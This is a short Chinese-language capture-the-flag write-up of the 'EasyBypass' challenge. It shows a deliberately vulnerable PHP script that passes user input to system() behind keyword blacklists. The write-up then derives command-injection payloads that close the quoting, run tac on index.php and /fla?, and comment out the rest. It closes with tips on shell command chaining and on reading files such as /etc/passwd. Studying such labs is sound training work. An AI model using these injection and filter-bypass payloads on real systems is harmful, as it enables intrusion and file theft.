---
layout: editorial
---

# EasyBypass

## EasyBypass

## 考点

* 命令执行拼接与绕过

## wp

```php
<?php

highlight_file(__FILE__);

$comm1 = $_GET['comm1'];
$comm2 = $_GET['comm2'];

if(preg_match("/\'|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $comm1))
    $comm1 = "";
if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is", $comm2))
    $comm2 = "";

$flag = "#flag in /flag";

$comm1 = '"' . $comm1 . '"';
$comm2 = '"' . $comm2 . '"';

$cmd = "file $comm1 $comm2";
system($cmd);
?>
```

要传入两个参数comm1和comm2，并且对它们两个有不同的限制，对比一下限制有何不同

两者都有的

```
' ` * \ \n \t \xA0 \r { } ( ) < &[^d] @ | tail bin less more string cat sh flag find ls grep echo w
```

comm1还不能有`nl pwd` ，comm2还不能有`" ; , tac` 。这也就意味着在comm1中可以使用`;` 进行命令分割，并且使用`"` 闭合语句，使用`#` 注释多余的语句

payload: `comm1=index.php";tac index.php;%23`

```
index.php";tac index.php;%23
index.php";tac /fla?;%23
```

## 小结

1. Linux命令拼接，`||` 只执行第一个，`&&` 先执行第一个再执行第二个，`|` 只执行第二个，`&` 先执行第一个再执行第二个
2. Linux命令`#` 用于单行注释
3. 读文件时善用通配符`.?*`
4. 读不了/etc/passwd就读index.php或者/etc/hosts
5. 在命令拼接时要考虑使用`;` 分割
